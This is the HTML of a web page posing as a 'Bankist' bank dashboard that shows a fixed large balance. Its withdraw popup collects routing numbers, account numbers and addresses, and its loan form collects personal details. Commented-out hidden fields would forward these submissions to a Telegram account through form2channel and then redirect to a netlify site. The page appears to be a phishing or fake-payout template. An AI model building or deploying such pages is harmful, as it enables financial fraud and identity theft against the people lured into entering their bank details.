<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

  <body>
    <header class="flex-space">
      <div class="flex-center gap1">
        <div><img src="./logo.png" class="logo" /></div>
        <h2 class="header-text">Bankist</h2>
      </div>
      <div class="flex-center gap1 clcuser">
        <svg
          xmlns="http://www.w3.org/2000/svg"
          fill="none"
          viewBox="0 0 24 24"
          stroke-width="1.5"
          stroke="currentColor"
          class="user-icon"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            d="M17.982 18.725A7.488 7.488 0 0012 15.75a7.488 7.488 0 00-5.982 2.975m11.963 0a9 9 0 10-11.963 0m11.963 0A8.966 8.966 0 0112 21a8.966 8.966 0 01-5.982-2.275M15 9.75a3 3 0 11-6 0 3 3 0 016 0z"
          />
        </svg>
        <h2 class="header-text username-label">Jonas!</h2>
      </div>
    </header>
    <main>
      <section class="display-section">
        <div class="balance-information flex-space">
          <div>
            <h2 class="secondary-heading">Current Balance</h2>
            <p class="date">As of 29/06/2023, 18:32</p>
          </div>
          <h1 class="balance-amount" id="number">25952,59$</h1>
        </div>
        <div class="operations-data">
          <button class="btn btn-transfer" style="color: white;">Withdraw</button>
          <button class="btn btn-request" style="color: white;">Request Loan</button>
        </div>
        <div class="analysis">
          <div class="card card-positive">
            <p class="card-title">IN</p>
            <h3 class="deposit-total-card card-amount">25952,59$</h3>
          </div>
          <div class="card card-negative">
            <p class="card-title">Out</p>
            <h3 class="withdraw-total-card card-amount">0$</h3>
          </div>
        </div>
        <div class="transactions"></div>
      </section>
      <section class="operations-container">
        <div class="userpoup">
          <i class="fas fa-x usclx"></i>
          <div class="useimg">
            <img src="./logo.png" alt="">
          </div>
          <hr>
          <div class="useinfo">
            <h3>Name: John doe</h3>
            <h3>Email: user@gmail.com</h3>
            <div>
              <a href="/" class="logout-btn"> &larr;&nbsp;Logout</a>
            </div>
          </div>
        </div>
        <div class="operations-data">
          <div class="flex-space stat">
            <h5 class="stats-heading">Average Withdraw</h5>
            <h5 class="stats-data avg-withdraw">15$</h5>
          </div>
          <div class="flex-space stat">
            <h5 class="stats-heading">Maximum Withdraw</h5>
            <h5 class="stats-data max-withdraw">15$</h5>
          </div>
          <div class="flex-space stat">
            <h5 class="stats-heading">Average Deposit</h5>
            <h5 class="stats-data avg-deposit">15$</h5>
          </div>
        </div>
        <div class="flex-space gap1">
          <div>
            <span class="mins date">00</span><span class="date"> : </span>
            <span class="seconds date">00</span>
          </div>
        </div>
      </section>
    </main>
    <div class="overlay-container hide"></div>

    <!-- withdraw-popups -->
    <div class="widraw-popp">
      <form action="" method="post">
        <!-- https://form2channel.com -->
        <!-- <input type="hidden" name="formto_telegram" value="1634205518">
        <input type="hidden" name="formto_redirect" value="https://gorgeous-tarsier-e02b1f.netlify.app/"> -->
        <button type="reset" class="resetbtn">Reset</button>
        <i class="fas fa-x clsx"></i>
        <div class="witdrrwtype-box">
          <h3 class="errmsg" style="text-align: center; color: red; font-size: 15px;"></h3>
          <div class="ammnt">
            <input type="number" name="amoun" id="amount" placeholder="Amount" class="amoun">
            <i class="fas fa-dollar-sign"></i>
          </div>
          <div class="typetrans">
            <select id="mySelect" name="state" class="seldeptype">
              <option value="">Select a payment method</option>
              <option value="direcdeposit">Direct deposit</option>
              <option value="cheque">Check</option>
            </select>
          </div>
          <div class="form1-box">
            <h2 style="text-align: center; margin-top: 1rem; font-size: 16px;">Fill out your bank details</h2>
            <input type="text" name="" id="" placeholder="Full name" class="transbb" required>
            <input type="number" name="Routenumber" placeholder="Routine number" class="transbb"  required>
            <input type="number" name="account" id="acctnum" placeholder="Account number" class="transbb"  required>
            <input type="text" name="Bank name" id="" placeholder="Bank name" class="transbb"  required>
          </div>
          <div class="form2-box">
            <h3 style="text-align: center; margin-top: 1rem; font-size: 16px;">Fill out your mailling address</h3>
            <!-- <span class="errmsg">All field is required</span> -->
            <input type="text" name="Address" id="" placeholder="Address" class="mailbb" required>
            <input type="text" name="city" placeholder="City" class="mailbb" required>
            <input type="text" name="state" id="" placeholder="State" class="mailbb" required>
            <input type="number" name="zip" id="" placeholder="Zipcode" class="mailbb" required>
          </div>
        </div>
        <div class="nextbt">Next</div>
        <a href="./sucess.html">
          <input type="button" value="Confirm withdraw" class="smit">
        </a>
        <!-- <button type="submit" class="kfmbtn">confirm</button> -->
      </form>
    </div>
    <div class="whole-loan" id="whole-loan">
      <section class="containerr">
        <h1 style="text-align: center;">Registration Form</h1>
        <form class="form" action="#">
          <i class="fas fa-x clsloan" style="text-align: end; cursor: pointer; font-size: 18px;"></i>
            <div class="input-box">
                <label>Full Name</label>
                <input required="" placeholder="Enter full name" type="text">
            </div>
            <div class="input-box">
              <label>Email address</label>
              <input required="" placeholder="Email address" type="text">
            </div>
            <div class="column">
                <div class="input-box">
                  <label>Phone Number</label>
                  <input required="" placeholder="Enter phone number" type="telephone">
                </div>
                <div class="input-box">
                  <label>Birth Date</label>
                  <input required="" placeholder="Enter birth date" type="date">
                </div>
            </div>
            <div class="gender-box">
              <label>Gender</label>
              <div class="gender-option" style="display: flex; gap: 1rem; text-align: center;">
                <div class="gender">
                  <input checked="" name="gender" id="check-male" type="radio">
                  <label for="check-male">Male</label>
                </div>
                <div class="gender">
                  <input name="gender" id="check-female" type="radio">
                  <label for="check-female">Female</label>
                </div>
                <div class="gender">
                  <input name="gender" id="check-other" type="radio">
                  <label for="check-other">Prefer not to say</label>
                </div>
              </div>
            </div>
            <div class="input-box address">
              <label>Address</label>
              <input required="" placeholder="Enter street address" type="text">
              <div class="column">
                <input required="" placeholder="State" type="text">
                <input required="" placeholder="Enter your city" type="text">
                <input required="" placeholder="Zipcode" type="number">
              </div>
            </div>
            <button class="smitt" type="button">
              <a href="./loan.html" style="text-decoration: none; color: white;">Submit</a>
            </button>
        </form>
      </section>
    </div>

      <div class="loader"></div>
